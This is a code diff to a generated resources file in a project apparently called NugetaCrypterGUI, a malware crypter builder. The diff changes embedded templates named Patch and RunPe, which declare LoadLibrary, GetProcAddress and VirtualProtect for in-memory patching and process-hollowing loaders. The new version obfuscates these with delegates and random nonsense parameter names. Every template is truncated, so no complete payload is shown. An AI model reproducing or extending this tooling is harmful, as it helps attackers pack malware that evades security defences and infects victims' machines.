@@ -64,16 +64,17 @@ namespace NugetaCrypterGUI {
         ///   Looks up a localized string similar to using System.Runtime.InteropServices;
         ///using System;
         ///using System.Text;
+        ///using System.Diagnostics;
+        ///
         ///namespace __Patch
         ///{
-        ///public class __Patcher
-        ///{
-        ///         [DllImport(&quot;kernel32&quot;)]
-        ///            public static extern IntPtr LoadLibrary(string name);
-        ///            [DllImport(&quot;kernel32&quot;)]
-        ///            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-        ///            [DllImport(&quot;kernel32&quot;)]
-        ///            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldPr [rest of string was truncated]&quot;;.
+        ///    public class __Patcher
+        ///    {
+        ///        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        ///        public delegate IntPtr GetProcAddress(IntPtr UrethralgiaOrc, string HypostomousBuried);
+        ///
+        ///        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        ///        public delegate bool VirtualProtect(IntPtr GhostwritingNard, UIntPtr NontabularlyBankshall, uint YohimbinizationUninscr [rest of string was truncated]&quot;;.
         /// </summary>
         internal static string Patch {
             get {
@@ -179,22 +180,20 @@ namespace NugetaCrypterGUI {
         }
         
         /// <summary>
-        ///   Looks up a localized string similar to $Win32 = @&quot;
+        ///   Looks up a localized string similar to using System.Reflection;
         ///using System;
         ///using System.Runtime.InteropServices;
-        ///public class Win32 {
-        ///	[DllImport(&quot;kernel32&quot;)]
-        ///	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-        ///	[DllImport(&quot;kernel32&quot;)]
-        ///	public static extern IntPtr LoadLibrary(string name);
-        ///	[DllImport(&quot;kernel32&quot;)]
-        ///	public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect,out uint lpflOldProtect);
-        ///}
-        ///&quot;@
-        ///
-        ///Add-Type $Win32
-        ///
-        ///foreach ($provider in Get-ChildItem  HKLM:\SOFTWARE\Microsoft [rest of string was truncated]&quot;;.
+        ///namespace __ScriptExecution
+        ///{
+        ///    public class __Executor
+        ///    {
+        ///        // Implement required kernel32.dll functions 
+        ///        [DllImport(&quot;kernel32&quot;)]
+        ///        public static extern IntPtr LoadLibrary(string name);
+        ///        [DllImport(&quot;kernel32&quot;)]
+        ///        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        ///        [DllImport(&quot;kernel32&quot;)]
+        ///        public static extern bool VirtualProtect(IntPtr lpAdd [rest of string was truncated]&quot;;.
         /// </summary>
         internal static string RunPe {
             get {
